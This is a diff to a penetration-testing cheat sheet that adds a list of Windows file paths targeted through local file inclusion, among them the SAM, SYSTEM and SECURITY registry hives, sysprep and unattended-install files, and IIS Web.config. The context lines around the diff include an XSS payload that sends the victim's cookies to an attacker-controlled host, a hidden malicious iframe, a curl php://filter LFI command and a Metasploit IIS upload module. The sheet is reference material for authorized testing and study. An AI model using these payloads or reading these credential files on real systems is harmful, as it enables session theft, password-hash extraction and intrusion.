@@ -363,7 +363,7 @@ HTTP Move:`curl -X Move --header`\
 HTTP Move: Metasploit: `exploit/windows/iis/iis_webdav_upload_asp`\
 XSS iframe test: `<iframe src="http://malicious-url/content" height="0" width="0"></iframe>`\
 XSS steal cookies: `<script>new image().src="http://192.168.0.1/submission.php?stolen_data="+document.cookie;</script>`\
-LFI/RFI Enumeration: `https://github.com/kurobeats/fimap`\
+RFI Enumeration: `https://github.com/kurobeats/fimap`\
 LFI/PHP filter: `curl -s http://vulnerale-page/?page=php://filter/convert.base64-encode/resource=index | base64 -d`\
 PHPinfo exploit: `https://github.com/kurobeats/fimap/wiki/FimapPhpInfoExploit`\
 LFI: `http://www.insomniasec.com/publications/LFI%20With%20PHPInfo%20Assistance.pdf`\
@@ -420,6 +420,50 @@ GoBuster Directory Appened forward-slash enumeration: `gobuster -u $IP -w wordli
 GoBuster File ext (-x) enumeration: `gobuster -u $IP -x PHP -w wordlist.txt -l -e -s 200,204,301,302,307,403,500 -t 30`\
 GoBuster options: `-t add slashes, -l length, -e extended URL, -s codes, -t threads`\
 Dirb through a proxy: `dirb [http://$ip/](http://172.16.0.19/) -p $ip:3129`
+
+### LFI Windows:
+C:\windows\win.ini
+C:\windows\system.ini
+C:\windows\iis.log
+C:\windows\windowsupdate.log
+C:\windows\system32\drivers\etc\hosts
+C:\windows\system32\config\system
+C:\windows\debug\netsetup.log
+C:\windows\debug\sammui.log
+C:\windows\debug\netlogon.log
+C:\windows\debug\passwd.log
+C:\windows\system32\winevt\logs\application.evtx
+C:\windows\system32\winevt\logs\system.evtx
+C:\windows\system32\winevt\logs\Windows PowerShell.evtx
+C:\windows\system32\winevt\logs\Microsoft-Windows-PowerShell%4Operational.evtx
+C:\windows\system32\winevt\logs\Microsoft-Windows-PowerShell%4Admin.evtx
+C:\windows\system32\winevt\logs\Windows PowerShell.evtx
+C:\windows\MpCmdRun.log
+C:\windows\NetSetup.LOG
+C:\windows\repair\sam
+C:\windows\System32\config\RegBack\SAM
+C:\windows\repair\system
+C:\windows\repair\software
+C:\windows\repair\security
+C:\windows\iis6.log
+C:\windows\system32\logfiles\httperr\httperr1.log
+C:\sysprep.inf
+C:\sysprep\sysprep.inf
+C:\sysprep\sysprep.xml
+C:\windows\Panther\Unattended.xml
+C:\inetpub\wwwroot\Web.config
+C:\windows\system32\config\AppEvent.Evt
+C:\windows\system32\config\SecEvent.Evt
+C:\windows\system32\config\default.sav
+C:\windows\system32\config\security.sav
+C:\windows\\system32\config\software.sav
+C:\windows\system32\config\system.sav
+C:\windows\system32\inetsrv\config\applicationHost.config
+C:\windows\system32\inetsrv\config\schema\ASPNET_schema.xml
+C:\windows\System32\drivers\etc\hosts
+C:\windows\System32\drivers\etc\networks
+C:\windows\system32\config\SAM
+
 
 ### Wordlists:
 
